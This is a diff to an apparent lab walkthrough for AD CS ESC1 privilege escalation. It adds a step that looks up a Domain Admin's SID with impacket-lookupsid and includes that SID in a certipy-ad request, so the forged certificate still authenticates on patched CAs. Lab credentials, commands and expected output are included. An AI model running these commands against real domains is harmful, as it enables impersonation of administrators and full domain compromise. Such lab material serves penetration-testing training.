@@ -44,14 +44,29 @@ Admin**, authenticate with it to recover that account's NTLM hash, and use the h
     > the CA's HTTPS enrollment endpoint (this lab uses HTTP). It's harmless — the exploit in
     > the next steps does not depend on it, and we already know the vulnerable template.
 
-1. Abuse ESC1: request a certificate from the vulnerable template, setting the subject UPN to
-   **adm.itadmin@corp.local** — i.e. ask the CA for a cert that identifies you as that Domain
-   Admin.
+1. First get the target's **SID**. Modern CAs (KB5014754) embed a SID into issued
+   certificates; to impersonate `adm.itadmin` cleanly you must request the cert **with that
+   user's SID**, otherwise auth fails with an *Object SID mismatch*.
+
+    ```bash
+    impacket-lookupsid corp.local/amiller:'Summer2024'@10.0.1.10 2>/dev/null | grep -iE 'Domain SID|itadmin'
+    ```
+
+    **Expected Output:** the domain SID and `adm.itadmin`'s RID — combine them:
+
+    ```output
+    [*] Domain SID is: S-1-5-21-1111111111-2222222222-3333333333
+    1104: CORP\adm.itadmin (SidTypeUser)
+    ```
+    → full SID = `S-1-5-21-1111111111-2222222222-3333333333-1104`
+
+1. Abuse ESC1: request a certificate from the vulnerable template, supplying both the target
+   **UPN** and **SID** — i.e. ask the CA for a cert that identifies you as that Domain Admin.
 
     ```bash
     certipy-ad req -u amiller@corp.local -p 'Summer2024' -dc-ip 10.0.1.10 \
       -target adcs.corp.local -ca 'corp-CA' -template 'ESC1-VulnUser' \
-      -upn 'adm.itadmin@corp.local'
+      -upn 'adm.itadmin@corp.local' -sid 'S-1-5-21-1111111111-2222222222-3333333333-1104'
     ```
 
     **Expected Output:** the CA issues the certificate and saves it locally.
@@ -60,6 +75,7 @@ Admin**, authenticate with it to recover that account's NTLM hash, and use the h
     [*] Requesting certificate via RPC
     [*] Successfully requested certificate
     [*] Got certificate with UPN 'adm.itadmin@corp.local'
+    [*] Got certificate with SID 'S-1-5-21-...-1104'
     [*] Saving certificate and private key to 'adm.itadmin.pfx'
     ```
 
